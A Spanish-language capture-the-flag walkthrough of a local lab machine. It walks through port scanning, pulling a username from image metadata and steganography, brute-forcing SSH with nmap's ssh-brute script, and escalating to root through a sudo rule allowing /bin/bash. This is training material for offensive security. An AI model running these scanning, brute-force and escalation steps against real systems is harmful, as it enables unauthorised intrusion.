- Tags: #BorazuwarahCTF
---
- [Maquina Borazuwareh](https://mega.nz/file/gWNQlaZD#CgYMb_EEBL0jcypTg0xZZUaIqhO47ueX6pPU6utLy1U) ==> Enlace de descarga del laboratorio.
```bash
 7z x borazuwarahctf.zip # Descomprimimos el archivo
 sudo bash auto_deploy.sh borazuwarahctf.tar # Desplegamos el laboratorio
```
---
- **( 172.17.0.2 )** ==> Direccion ip del **target**

#### Fase Reconocimiento:
```bash
ping -c 1 172.17.0.2 # Realizamos una traza ICMP para ver si tenemos comunicacion con el target

wichSystem.py 172.17.0.2 # Usamos nuestra herramienta para determinar ante que nos estamos enfrentando
172.17.0.2 (ttl -> 64): Linux
```
---

#### Fase Reconocimiento Puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos descubrimiento puertos en el target
 extractPorts allPorts # parseamos la informacion mas releveante del primer escaneo
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted # Realizmaos un escaneo exhaustivo para determinar el servicio y la version que corren detras de estos puertos
nmap --script http-enum -p80 172.17.0.2 # No nos reporta nada
```
---
- **( 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) )** ==> Tenemos esta version de ssh
- **( OpenSSH 9.2p1 Debian )** ==> Por el **codeName** buscamos en la web **launchPad**, donde nos reporta que estamos ante una posible version de: **( debianSid )** 
- **( 80/tcp open  http    Apache httpd 2.4.59 ((Debian)) )** ==> Tenemos un servicio de apache desplegado por el puerto 80

#### Fase Reconocimiento Web:
- **( http://172.17.0.2/ )** ==> Ingresamos a la web.
```bash
whatweb http://172.17.0.2 # No nos reporta informacion critica
http://172.17.0.2 [200 OK] Apache[2.4.59], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[172.17.0.2]
```
---
- **( Imagen )** ==> Tenemos una imagen que tendremos que descargar para auditarla.

#### Auditando Imagen:
```bash
file imagen.jpeg # Reviasmos que tipo de archivo es.
binwalk -e imagen.jpeg # Analizmaos la estructura en busca de archivos oculto.
strings imagen.jpeg # Con este logramos enocntrar informacion que posiblemente sea de un uusario valido en el servicio ssh expuesto.
```
---
```bash
<rdf:li xml:lang='x-default'>---------- User: borazuwarah ----------</rdf:li>
<rdf:li xml:lang='x-default'>---------- Password:  ----------</rdf:li>
```
---
- Nos intentamos conectar por el servicio **ssh**, Pero aun no podemos necesitamos algo mas
```bash
steghide info imagen.jpeg # Nos reporta que existe un archivo adjunto en la imagen.
archivo adjunto "secreto.txt": # Tenemos un archivo que tendremos que extraer
steghide extract -sf imagen.jpeg # Extraemos el archivo
```
---
- Este archivo no contiene ninguna informacion relevante, Asi que aplicaremos fuerza bruta para detectar las credenciales de este usuario
```bash
nmap -p22 --script ssh-brute --script-args userdb=users.txt 172.17.0.2

borazuwarah:123456 - Valid credentials # Logramos obtenere la password para este usuario.
```
---
- Realizamos la conexion logrando acceder con esta cuenta.
```bash
 ssh-keygen -R 172.17.0.2 && ssh borazuwarah@172.17.0.2 # Proporcionamos la password.
```
---

#### Escalada Privilegios:
```bash
sudo -l

User borazuwarah may run the following commands on f7310885a0b9:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```
---
- Tenemos una via potencial de elevar privilegios;
```bash
sudo -u root bash
```
---
- Ahora somo el usuario privilegiado **root**.